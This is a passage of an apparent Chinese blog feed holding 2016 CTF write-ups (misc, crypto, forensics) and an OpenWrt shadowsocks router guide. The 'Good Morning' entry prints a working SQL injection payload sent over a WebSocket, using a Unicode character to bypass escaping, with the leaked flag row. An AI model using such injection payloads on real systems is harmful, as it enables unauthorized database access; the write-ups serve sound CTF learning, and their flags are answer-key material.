.... ..-. -.. .. .. ---..</span><br><span class="line">.-.. -... .. -.... .-. --.. --... .- ...-- .... - .... ..-. -.-- -. .---- ....-</span><br><span class="line">.. -.- ..- .-. -.-. .... -.... ----- --... .-- -. .-.. --- -.-. ---.. -.-. - ...</span><br><span class="line">.--- ..- ----. ... - ..-. .- .--- .- ..-. ..- --. . -..- --. -.- ..... .-.. ...-</span><br><span class="line">-.... ..--- - -. ..- --.. -.. -.-. -. -.... .---- ..-. ... -..- .-.</span><br></pre></td></tr></table></figure></p><p>是摩斯码，解码后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G31GPR6CEJ1B8ZW33XVPRPICDQEUHFDII8LBI6RZ7A3HTHFYN14IKURCH607WNLOC8CTSJU9STFAJAFUGEXGK5LV62TNUZDCN61FSXR</span><br></pre></td></tr></table></figure></p><p>发现是<code>BASE36</code>编码，解码后：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">8897369972590062872663949970759944050758061394015713023721761165709499616078748844055640215564311564036488485901952528001379266489687681558591511507697302448447</span><br></pre></td></tr></table></figure></p><p>将这一串数字按字符串形式显示得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"> ,+.</span><br><span class="line">//|\\</span><br><span class="line">|||||</span><br><span class="line">\\|//</span><br><span class="line"> `+&apos;</span><br><span class="line">What is the SHA256(Coconut3215323173)?</span><br></pre></td></tr></table></figure></p><p>算一下给出字符串的<code>SHA256</code>，然后按照以上方式编码，再传给服务器，就可以得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Nice! Here&apos;s a flag for you: PCTF&#123;c0c0c0nutBaze_4__d4ys&#125;.</span><br></pre></td></tr></table></figure></p><h3 id="Untitled-1-pdf"><a href="#Untitled-1-pdf" class="headerlink" title="Untitled-1.pdf"></a>Untitled-1.pdf</h3><p>Misc (50 pts)<br>This PDF has a flag on it, but I can’t find it… can you?</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pdftotext Untitled.pdf</span><br></pre></td></tr></table></figure><p><code>PCTF{how_2_pdf_yo}</code></p><h3 id="hevc"><a href="#hevc" class="headerlink" title="hevc"></a>hevc</h3><p>Misc (50 pts)<br>Welcome to the future.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffmpeg -i out.raw out.avi</span><br></pre></td></tr></table></figure><p>视频中是手写的镜像flag：<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/2016/PlaidCTF/Misc/out.avi.png" alt="hevcflag"><br>人工识别下得到：<code>PCTF{DAT_CODEC_THO}</code></p><h3 id="the-stuff"><a href="#the-stuff" class="headerlink" title="the stuff"></a>the stuff</h3><p>Misc (50 pts)<br>Can you believe Ryan uses Bing?</p><p>用<code>wireshark</code>打开流量文件发现其中有邮件内容，过滤出来：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Message-ID: &lt;1460851088.7821.1.camel@ubuntu&gt;</span><br><span class="line">Subject: The Stuff</span><br><span class="line">From: John Doe &lt;jdoe@example.com&gt;</span><br><span class="line">To: jsmith@example.com</span><br><span class="line">Date: Sat, 16 Apr 2016 16:58:08 -0700</span><br><span class="line">Content-Type: multipart/mixed; boundary=&quot;=-zAAY+FBv9yZgwoZy4KHy&quot;</span><br><span class="line">X-Mailer: Evolution 3.10.4-0ubuntu2 </span><br><span class="line">Mime-Version: 1.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">--=-zAAY+FBv9yZgwoZy4KHy</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Yo, I got the stuff.</span><br><span class="line"></span><br><span class="line">--=-zAAY+FBv9yZgwoZy4KHy</span><br><span class="line">Content-Type: application/zip; name=&quot;flag.zip&quot;</span><br><span class="line">Content-Disposition: attachment; filename=&quot;flag.zip&quot;</span><br><span class="line">Content-Transfer-Encoding: base64</span><br><span class="line"></span><br><span class="line">Message-ID: &lt;1460851191.7821.2.camel@ubuntu&gt;</span><br><span class="line">Subject: Wait, hang on</span><br><span class="line">From: John Doe &lt;jdoe@example.com&gt;</span><br><span class="line">To: jsmith@example.com</span><br><span class="line">Date: Sat, 16 Apr 2016 16:59:51 -0700</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">X-Mailer: Evolution 3.10.4-0ubuntu2 </span><br><span class="line">Mime-Version: 1.0</span><br><span class="line">Content-Transfer-Encoding: 7bit</span><br><span class="line"></span><br><span class="line">Yo, you&apos;ll need this too: super_password1</span><br></pre></td></tr></table></figure></p><p>其中<code>flag.zip</code>的文件内容被编码了，先提取出来，然后解码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base64 -d base64-flag &gt; flag.zip</span><br></pre></td></tr></table></figure></p><p>用后面邮件中的密码来解压<code>flag.zip</code>文件，得到图片：<br><img src="http://7oxj8e.com1.z0.glb.clouddn.com/2016/PlaidCTF/Misc/flag.jpg" alt="the stuffflag"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>BCTF 2016 Special RSA Write-up</title>
      <link href="/2016/03/24/BCTF-2016-Special-RSA-Write-up/"/>
      <url>/2016/03/24/BCTF-2016-Special-RSA-Write-up/</url>
      <content type="html"><![CDATA[<p>Problem<br>While studying and learning RSA, I knew a new form of encryption/decryption with<br>the same safety as RSA.</p><p>I encrypted msg.txt and got msg.enc as an example for you.</p><p><code>$ python special_rsa.py enc msg.txt msg.enc</code></p><p>Can you recover flag.txt from flag.enc?</p><p><a href="https://raw.githubusercontent.com/ctfs/write-ups-2016/master/bctf-2016/crypto/special_rsa-200/special_rsa.zip.f6e85b8922b0016d64b1d006529819de" target="_blank" rel="noopener">special_rsa.zip.f6e85b8922b0016d64b1d006529819de</a></p><a id="more"></a><p>加密过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c = (pow(k, r, N) * m) % N</span><br></pre></td></tr></table></figure></p><p>解密过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">k_inv = modinv(k, N)</span><br><span class="line">m = pow(k_inv, r, N) * c % N</span><br></pre></td></tr></table></figure></p><p>根据提供的<code>msg.txt</code>，可以得到两对m和c，使用的key相同，只是r不同，可以用这两组反推出key来：</p><ul><li>求 m 的逆元<br><code>m_inv = modinv(m, N)</code></li><li>c 乘上m的逆元得到 pow(k, r, N)<br><code>c * m_inv % N = pow(k, r, N) % N = pow(k, r, N)</code></li><li>通过<code>msg.enc</code>得到两段pow(k, r1, N), pow(k, r2, N)<br>p1 = c1 <em> m_inv % N = pow(k, r1, N) % N = pow(k, r1, N)<br>p2 = c2 </em> m_inv % N = pow(k, r2, N) % N = pow(k, r2, N)</li><li>这时候只要找到z1和z2，满足下式，即可得pow(k, r1 <em> z1 + r2 </em> z2, N)=pow(k, 1,<br>N)<br><code>r1 * z1 + r2 * z2 = 1</code></li><li>Extended Euclid Algorithm 可以求解z1，z2<br><code>[gcd(r1, r2), z1, z2] = egcd(r1, r2)</code><br>恰巧gcd(r1, r2) = 1</li></ul><p>结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">key:</span><br><span class="line">175971776542095822590595405274258668271271366360140578776612582276966567082080372980811310146217399585938214712928761559525614866113821551467842221588432676885027725038849513527080849158072296957428701767142294778752742980766436072183367444762212399986777124093501619273513421803177347181063254421492621011961</span><br><span class="line">flag: BCTF&#123;q0000000000b3333333333-ju57-w0n-pwn20wn!!!!!!!!!!!!&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>路由器配置梯子</title>
      <link href="/2016/03/13/%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%A2%AF%E5%AD%90/"/>
      <url>/2016/03/13/%E8%B7%AF%E7%94%B1%E5%99%A8%E9%85%8D%E7%BD%AE%E6%A2%AF%E5%AD%90/</url>
      <content type="html"><![CDATA[<h1 id="梯子配置"><a href="#梯子配置" class="headerlink" title="梯子配置"></a>梯子配置</h1><h2 id="工具列表"><a href="#工具列表" class="headerlink" title="工具列表"></a>工具列表</h2><ol><li>智能路由器</li><li>OpenWrt</li><li>shadowsocks-libev-spec</li><li>ChinaDNS</li><li>Dnsmasq</li></ol><a id="more"></a><hr><p>2016-03-22 更新<br>现在来介绍另一种方法：shadowsocks+gfwlist<br>去下载<a href="https://github.com/bettermanbao/openwrt-shadowsocks-libev-full" target="_blank" rel="noopener">openwrt-shadowsocks-lebev-full</a>，根据需要安装相应版本。<br>安装好之后重启路由器，然后修改shadowsocks的配置，保存之后就可以用了，相当方便。<br>使用这种发方法的好处是无需<code>ChinaDNS</code>来判断<code>DNS</code>是否被污染，另外通过<code>gfwlist</code>来判断，这样大部分无需走代理，速度会快很多。<br>另外，发现<code>shadowsocks</code>不是很稳定，我就把每隔10分钟调用<code>watchdog</code>的任务给关闭了，这样我自己手动判断就好，不能用就直接上PC端的<code>shadowsocks</code>。</p><hr><h2 id="智能路由器"><a href="#智能路由器" class="headerlink" title="智能路由器"></a>智能路由器</h2><p>现在智能路由器很多，根据自己喜好来选吧，记住一点可以自己刷系统就行。我这里使用的是Lenovo<br>Y1，主要是因为便宜。^_^</p><h2 id="OpenWrt"><a href="#OpenWrt" class="headerlink" title="OpenWrt"></a>OpenWrt</h2><p><a href="https://openwrt.org/" target="_blank" rel="noopener">OpenWrt</a>是嵌入式设备上运行的Linux系统。自己去官网上找路由器对应的系统固件，然后刷入。我使用的是<a href="http://downloads.openwrt.org.cn/PandoraBox/Lenovo-Y1_RY-1S/" target="_blank" rel="noopener">PandoraBox</a>。</p><blockquote><p>PandoraBox<br>是OpenWrt的一条分支，前身是DreamBox，由OpenWrt中国创始人之一的Lintel<br>所带领的技术团队维护。<br>用它的主要原因是对Y1的2.4G和5G信号支持的好。</p></blockquote><p>登录后，先把基本内容配好，能联网。PandoraBox自带的软件源不太稳定，而且软件包都比较旧，我用OpenWrt的国内源替换了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">arch all 100</span><br><span class="line">arch noarch 200</span><br><span class="line">arch ralink 300</span><br><span class="line">arch ramips_24kec 400</span><br><span class="line">dest root /</span><br><span class="line">dest ram /tmp</span><br><span class="line">lists_dir ext /var/opkg-lists</span><br><span class="line">option overlay_root /overlay</span><br><span class="line"></span><br><span class="line">src/gz r2_base</span><br><span class="line">http://mirrors.ustc.edu.cn/openwrt/chaos_calmer/15.05/ramips/mt7620/packages/base</span><br><span class="line">src/gz r2_management</span><br><span class="line">http://mirrors.ustc.edu.cn/openwrt/chaos_calmer/15.05/ramips/mt7620/packages/management</span><br><span class="line">src/gz r2_packages</span><br><span class="line">http://mirrors.ustc.edu.cn/openwrt/chaos_calmer/15.05/ramips/mt7620/packages/packages</span><br><span class="line">src/gz r2_routing</span><br><span class="line">http://mirrors.ustc.edu.cn/openwrt/chaos_calmer/15.05/ramips/mt7620/packages/routing</span><br><span class="line">src/gz r2_telephony</span><br><span class="line">http://mirrors.ustc.edu.cn/openwrt/chaos_calmer/15.05/ramips/mt7620/packages/telephony</span><br></pre></td></tr></table></figure></p><blockquote><p>前四行是为了支持rampis架构的软件包，后面会用到。<br>如果界面语言是英文，需要先安装中文语言包<code>luci-i18n-chinese</code>。</p></blockquote><h2 id="shadowsocks"><a href="#shadowsocks" class="headerlink" title="shadowsocks"></a>shadowsocks</h2><p>如果用的是OpenWrt的源，软件包里的Shadowsocks应该是最新版的。如果不是的话去<a href="https://sourceforge.net/projects/openwrt-dist/files/" target="_blank" rel="noopener">OpenWrt-dist</a>下载，手动安装。</p><ul><li><p>shadowsocks-libev<br>官方原版<br>可执行文件 ss-{local,redir,tunnel}<br>默认启动: ss-local 提供 SOCKS 代理</p></li><li><p>shadowsocks-libev-spec<br>针对 OpenWrt 的优化版本<br>可执行文件 ss-{redir,rules,tunnel}<br>默认启动:<br>ss-redir 提供透明代理, 从 v2.2.0 开始支持 UDP<br>ss-rules 生成代理转发规则<br>ss-tunnel 提供 UDP 转发, 用于 DNS 查询</p></li></ul><p>这里需要UDP转发功能，所以使用shadowsocks-libev-spec。</p><blockquote><p>记得安装shadowsocks的luci，这样才可以在Web界面下配置。</p></blockquote><p>服务器配置那里不用说了，说一下UDP转发：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UDP本地端口：5300</span><br><span class="line">UDP转发地址：8.8.8.8:53</span><br></pre></td></tr></table></figure></p><p>转发地址一般用的是<code>Google DNS：8.8.8.8</code>。<br>忽略IP列表选择使用ChinaDNS路由表。</p><h3 id="ChinaDNS"><a href="#ChinaDNS" class="headerlink" title="ChinaDNS"></a>ChinaDNS</h3><p>在配置之前先下载<a href="https://raw.githubusercontent.com/softwaredownload/openwrt-fanqiang/master/openwrt/default/etc/chinadns_chnroute.txt" target="_blank" rel="noopener">ChinaDNS<br>Route</a>，然后上传到路由器的<code>/etc/</code>下。</p><blockquote><p>可以用scp命令也可以用WinSCP软件，原理都是一样的。</p></blockquote><p>下面是ChinaDNS的主要配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">本地端口：5353</span><br><span class="line">国内路由表：/etc/chinadns_chnroute.txt</span><br><span class="line">上游服务器：114.114.114.114,127.0.0.1:5300</span><br></pre></td></tr></table></figure></p><blockquote><p>国内路由表是为了让国内的IP不走代理。</p></blockquote><h3 id="Dnsmasq"><a href="#Dnsmasq" class="headerlink" title="Dnsmasq"></a>Dnsmasq</h3><p>一般自带，如果不是<code>dnsmasq-full</code>版，把之前的卸载。<br>然后去<code>网络-&gt;DHCP/DNS</code>那里配置：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DNS转发：127.0.0.1#5353</span><br><span class="line">忽略解析文件：选中</span><br></pre></td></tr></table></figure></p><p>经过以上设置后，DNS的查询变为</p><ul><li>设备查询dns-&gt;路由器:53-&gt;chinaDNS-&gt;114.114.114.114:53</li><li>设备查询dns-&gt;路由器:53-&gt;chinaDNS-&gt;ss:5300-&gt;8.8.8.8:53</li></ul>]]></content>
      
      <categories>
          
          <category> OpenWrt </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OpenWrt </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Boston Key Party CTF 2016 des ofb Write-up</title>
      <link href="/2016/03/11/Boston-Key-Party-CTF-2016-des-ofb-Write-up/"/>
      <url>/2016/03/11/Boston-Key-Party-CTF-2016-des-ofb-Write-up/</url>
      <content type="html"><![CDATA[<p>[9]: des ofb<br>Points: 2<br>Decrypt the message, find the flag, and then marvel at how broken everything is.<br><a href="https://s3.amazonaws.com/bostonkeyparty/2016/e0289aac2e337e21bcf0a0048e138d933b929a8c.tar" target="_blank" rel="noopener">https://s3.amazonaws.com/bostonkeyparty/2016/e0289aac2e337e21bcf0a0048e138d933b929a8c.tar</a></p><a id="more"></a><p>下载后查看源码，发现是<code>DES</code>加密，知道<code>IV</code>，但不知道<code>key</code>，搜索了一下啊，找到<a href="https://en.wikipedia.org/wiki/Weak_key#Weak_keys_in_DES" target="_blank" rel="noopener">Weak<br>key in<br>DES</a>，尝试给出的弱密钥，使用<code>0xE1E1E1E1F0F0F0F0</code>解密得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">To be, or not to be, that is the question:</span><br><span class="line">Whether &apos;tis Nobler in the mind to suffer</span><br><span class="line">The Slings and Arrows of outrageous Fortune,</span><br><span class="line">Or to take Arms against a Sea of troubles,</span><br><span class="line">And by opposing end them: to die, to sleep</span><br><span class="line">No more; and by a sleep, to say we end</span><br><span class="line">The Heart-ache, and the thousand Natural shocks</span><br><span class="line">That Flesh is heir to? &apos;Tis a consummation</span><br><span class="line">Devoutly to be wished. To die, to sleep,</span><br><span class="line">To sleep, perchance to Dream; aye, there&apos;s the rub,</span><br><span class="line">For in that sleep of death, what dreams may come,</span><br><span class="line">When we have shuffled off this mortal coil,</span><br><span class="line">Must give us pause. There&apos;s the respect</span><br><span class="line">That makes Calamity of so long life:</span><br><span class="line">For who would bear the Whips and Scorns of time,</span><br><span class="line">The Oppressor&apos;s wrong, the proud man&apos;s Contumely,</span><br><span class="line">The pangs of despised Love, the Law’s delay,</span><br><span class="line">The insolence of Office, and the Spurns</span><br><span class="line">That patient merit of the unworthy takes,</span><br><span class="line">When he himself might his Quietus make</span><br><span class="line">With a bare Bodkin? Who would Fardels bear,</span><br><span class="line">To grunt and sweat under a weary life,</span><br><span class="line">But that the dread of something after death,</span><br><span class="line">The undiscovered Country, from whose bourn</span><br><span class="line">No Traveller returns, Puzzles the will,</span><br><span class="line">And makes us rather bear those ills we have,</span><br><span class="line">Than fly to others that we know not of.</span><br><span class="line">Thus Conscience does make Cowards of us all,</span><br><span class="line">And thus the Native hue of Resolution</span><br><span class="line">Is sicklied o&apos;er, with the pale cast of Thought,</span><br><span class="line">And enterprises of great pitch and moment,</span><br><span class="line">With this regard their Currents turn awry,</span><br><span class="line">And lose the name of Action. Soft you now,</span><br><span class="line">The fair Ophelia? Nymph, in thy Orisons</span><br><span class="line">Be all my sins remembered. BKPCTF&#123;so_its_just_a_short_repeating_otp!&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSCTF 2016 Quals Chain Rule Write-up</title>
      <link href="/2016/03/08/SSCTF-2016-Quals-Chain-Rule-Write-up/"/>
      <url>/2016/03/08/SSCTF-2016-Quals-Chain-Rule-Write-up/</url>
      <content type="html"><![CDATA[<p>解题说明<br>Description</p><p>Try ‘start’</p><p><a href="http://static.lab.seclover.com/crypto/crypto2-b7486602.zip" target="_blank" rel="noopener">战题链接</a></p><a id="more"></a><p>下载文件后，解压出一堆<code>zip</code>文件。根据提示密码可能是<code>start</code>，写个脚本，把所有的文件都试一遍。得到一个<code>1.txt</code>文件，里面内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Next password is [hh.M5Px4U%8]*2z</span><br></pre></td></tr></table></figure></p><p>获得下一个密码，继续在文件中试这个密码，到最后会得到两个文件：<code>flag.zip</code>和<code>pwd.zip</code>。把<code>pwd.zip</code>文件解压出来，又得到一堆<code>txt</code>文件。打开<code>start.txt</code>文件，提示下一个文件，这样一直打开下去，最后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Follow the path, collect the comments. Avoid the BLACKHOLE!</span><br></pre></td></tr></table></figure></p><p>根据<code>zip</code>文件格式，需要提取<code>pwd.zip</code>文件里的<code>comments</code>，最后得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">When I am dead, my dearest,</span><br><span class="line">Sing no sad songs for me;</span><br><span class="line">Plant thou no roses at my head,</span><br><span class="line">Nor shady cypress tree:</span><br><span class="line">Be the green grass above me</span><br><span class="line">With showers and dewdrops wet:</span><br><span class="line">And if thou wilt, remember,</span><br><span class="line">And if thou wilt, forget.</span><br><span class="line">password part1:Thispasswordistoolong</span><br><span class="line">I shall not see the shadows,</span><br><span class="line">I shall not see the rain;</span><br><span class="line">I shall not hear the nightingle</span><br><span class="line">Sing on as if in pain:</span><br><span class="line">And dreaming through the twilight</span><br><span class="line">That doth not rise nor set,</span><br><span class="line">Haply I may remember,</span><br><span class="line">And haply I may forget.</span><br><span class="line">password part2:andyoudon’twanttocrackitbybruteforce</span><br></pre></td></tr></table></figure></p><p>使用给出的密码来解压<code>flag.zip</code>文件，得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag isSSCTF&#123;Somewhere_Over_The_Rainbow&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Boston Key Party CTF 2016 Good Morning Write-up</title>
      <link href="/2016/03/07/Boston-Key-Party-CTF-2016-Good-Morning-Write-up/"/>
      <url>/2016/03/07/Boston-Key-Party-CTF-2016-Good-Morning-Write-up/</url>
      <content type="html"><![CDATA[<p>[7] : Good Morning<br>Points: 3<br><a href="http://52.86.232.163:32800/" target="_blank" rel="noopener">http://52.86.232.163:32800/</a><br><a href="https://s3.amazonaws.com/bostonkeyparty/2016/bffb53340f566aef7c4169d6b74bbe01be56ad18.tgz" target="_blank" rel="noopener">https://s3.amazonaws.com/bostonkeyparty/2016/bffb53340f566aef7c4169d6b74bbe01be56ad18.tgz</a></p><a id="more"></a><p>审计源码时候发现：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cursor.execute(<span class="string">'SELECT * FROM answers WHERE question="%s" AND answer="%s"'</span> %</span><br><span class="line">(question, answer))</span><br></pre></td></tr></table></figure></p><p>使用Unicode字符00A5来绕过预编译，从而来进行SQL注入。在<code>console</code>下执行：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = <span class="keyword">new</span> WebSocket(<span class="string">"ws://52.86.232.163:32800/ws"</span>);</span><br><span class="line">socket.send(<span class="built_in">JSON</span>.stringify(&#123;<span class="string">"type"</span>: <span class="string">"get_answer"</span>, <span class="string">"question"</span>: <span class="string">"name\u00a5"</span>,</span><br><span class="line"><span class="string">"answer"</span>: <span class="string">" or 1=1 #"</span>&#125;));</span><br></pre></td></tr></table></figure></p><p>查看返回结构：<br><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"topic"</span>: <span class="string">"name"</span>, <span class="attr">"last"</span>: <span class="literal">false</span>, <span class="attr">"type"</span>: <span class="string">"question"</span>&#125;<span class="number">52</span></span><br><span class="line">14:55:50.094</span><br><span class="line">&#123;<span class="attr">"type"</span>:<span class="string">"get_answer"</span>,<span class="attr">"question"</span>:<span class="string">"name¥"</span>,<span class="attr">"answer"</span>:<span class="string">" or 1=1 #"</span>&#125;<span class="number">61</span></span><br><span class="line">14:56:00.456</span><br><span class="line">&#123;<span class="attr">"type"</span>: <span class="string">"got_answer"</span>, <span class="attr">"row"</span>: [<span class="number">1</span>, <span class="string">"flag"</span>, <span class="string">"BKPCTF&#123;TryYourBestOnTheOthersToo&#125;"</span>]&#125;</span><br></pre></td></tr></table></figure></p><p>得到Flag：<code>BKPCTF{TryYourBestOnTheOthersToo}</code>。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSCTF 2016 Quals Speed Data Write-up</title>
      <link href="/2016/03/04/SSCTF-2016-Quals-Speed-Data-Write-up/"/>
      <url>/2016/03/04/SSCTF-2016-Quals-Speed-Data-Write-up/</url>
      <content type="html"><![CDATA[<p>解题说明<br>Description</p><p>Please Get Digital Evidence</p><p><a href="http://static.lab.seclover.com/misc/misc2-ecac0a7e.zip" target="_blank" rel="noopener">战题链接</a></p><a id="more"></a><p>解压后是一个<code>pdf</code>文件，看了下没什么东西，考虑到可能是隐写，<code>Google</code>了一下<code>pdf</code>隐写工具，找到<code>wbStego4</code>，直接<code>decode</code>得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag  s SSCTF&#123;6a6857ce76d4d6ce3b0e02b9e3738698&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>SSCTF 2016 Quals HeHeDa Write-up</title>
      <link href="/2016/03/02/SSCTF-2016-Quals-HeHeDa-Write-up/"/>
      <url>/2016/03/02/SSCTF-2016-Quals-HeHeDa-Write-up/</url>
      <content type="html"><![CDATA[<p>HeHeDa<br>解题说明<br>Description</p><p>Crack Algorithm~</p><p><a href="http://static.lab.seclover.com/crypto/Algorithm1-577265e1.zip" target="_blank" rel="noopener">战题链接</a></p><a id="more"></a><p>分析源码，发现就是按字节加密，代码中写明密钥长度为8，所以直接爆破即可。具体代码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span 